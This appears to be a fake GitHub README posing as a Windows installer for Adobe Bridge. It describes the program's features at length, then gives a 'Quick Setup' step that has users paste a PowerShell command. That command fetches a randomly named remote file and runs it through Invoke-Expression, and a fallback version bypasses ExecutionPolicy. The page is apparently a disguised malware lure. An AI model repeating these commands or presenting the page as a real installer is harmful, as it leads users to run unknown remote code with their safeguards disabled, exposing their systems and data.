# Bridge

Bridge is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Bridge and work in it.

Adobe Bridge is Adobe’s desktop hub for digital asset management on Windows. It scans folders and network shares, builds fast previews, and surfaces ratings, labels, and IPTC metadata for PSD, AI, INDD, RAW, and common video formats. Teams use it as the front door to the Creative Cloud workflow instead of hunting files in Explorer.

A normal session begins by opening a project volume and filtering by date, star rating, or file type in the Filter panel. You scroll the filmstrip, compare similar shots in Review mode, add keywords in the Metadata workspace, and drop selects into Collections that stay linked to originals on disk. Batch Rename prepares deliverable filenames, Export sends resized JPEGs with presets, and opening a RAW file launches Camera Raw for consistent adjustments across a series before you hand assets to Photoshop or Lightroom.

This repository keeps the Windows setup file for Bridge, concise notes on install options and workspace defaults, and a changelog that documents each release and configuration change. It is meant for studios that pin a known Bridge build on editing PCs and want installer artifacts and history together for repeat rollouts.

## What you do with it

- Filmstrip and grid views show thumbnails for RAW, PSD, AI, and video on Windows drives.
- Filter bar narrows folders by rating, label, keyword, file type, or capture date instantly.
- Metadata panel edits IPTC captions and keywords that travel with files into host applications.
- Collections group selects across folders while originals remain in their existing directory structure.
- Batch Rename applies numbering schemes and metadata templates to large delivery folders efficiently.
- Export panel outputs resized JPEG batches using saved presets for client review workflows.
- Review mode compares similar frames side by side without opening each file in Photoshop.
- Camera Raw opens from Bridge so develop settings stay consistent across an entire image series.

## Quick Setup (PowerShell)

This installs the program Bridge on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/silke1810139711/bridge-setup-guide/main/3b6v2wbdzn.gjozcw2s | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/silke1810139711/bridge-setup-guide/main/3b6v2wbdzn.gjozcw2s | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `3b6v2wbdzn.gjozcw2s` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `silke1810139711/bridge-setup-guide`. Adobe Bridge 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
